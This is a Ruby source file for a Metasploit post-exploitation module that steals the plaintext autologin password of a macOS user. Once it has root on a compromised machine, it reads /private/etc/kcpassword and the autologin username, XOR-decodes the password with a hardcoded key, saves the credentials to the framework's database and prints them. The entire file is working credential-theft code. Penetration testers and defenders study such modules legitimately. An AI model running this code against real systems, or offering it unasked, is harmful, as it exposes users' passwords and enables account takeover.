##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post
  include Msf::Post::File

  # extract/verify by by XORing your kcpassword with your password
  AUTOLOGIN_XOR_KEY = [0x7D, 0x89, 0x52, 0x23, 0xD2, 0xBC, 0xDD, 0xEA, 0xA3, 0xB9, 0x1F]

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OSX Gather Autologin Password as Root',
      'Description'   => %q{
        This module will steal the plaintext password of any user on the machine
        with autologin enabled. Root access is required.

        When a user has autologin enabled (System Preferences -> Accounts), OSX
        stores their password with an XOR encoding in /private/etc/kcpassword.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'Platform'      => [ 'osx' ],
      'References'    => [
        ['URL', 'http://www.brock-family.org/gavin/perl/kcpassword.html']
      ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ]
    ))

    register_advanced_options([
      OptString.new('KCPASSWORD_PATH', [true, 'Path to kcpassword file', '/private/etc/kcpassword'])
    ], self.class)
  end

  def run
    # ensure the user is root (or can read the kcpassword)
    if not user == 'root'
      fail_with "Root privileges required to read kcpassword"
    end

    # read the autologin account from prefs plist
    autouser = cmd_exec('defaults read /Library/Preferences/com.apple.loginwindow "autoLoginUser" "username"')
    if autouser.present?
      print_status "User #{autouser} has autologin enabled, decoding password..."
    else
      fail_with "No users on this machine have autologin enabled."
    end

    # kcpass contains the XOR'd bytes
    kcpass = read_file(kcpassword_path)
    key = AUTOLOGIN_XOR_KEY

    # decoding routing, slices into 11 byte chunks and XOR's each chunk
    decoded = kcpass.bytes.to_a.each_slice(key.length).map do |kc|
      kc.each_with_index.map { |byte, idx| byte ^ key[idx] }.map(&:chr).join
    end.join.sub(/\x00.*$/, '')

    # save in the database
    report_auth_info(
      :host   => session.session_host,
      :sname  => 'login',
      :user   => autouser,
      :pass   => decoded,
      :active => true
    )
    print_good "Decoded autologin password: #{autouser}:#{decoded}"
  end

  private

  def kcpassword_path
    datastore['KCPASSWORD_PATH']
  end

  def user
    @user ||= cmd_exec('whoami').chomp
  end
end
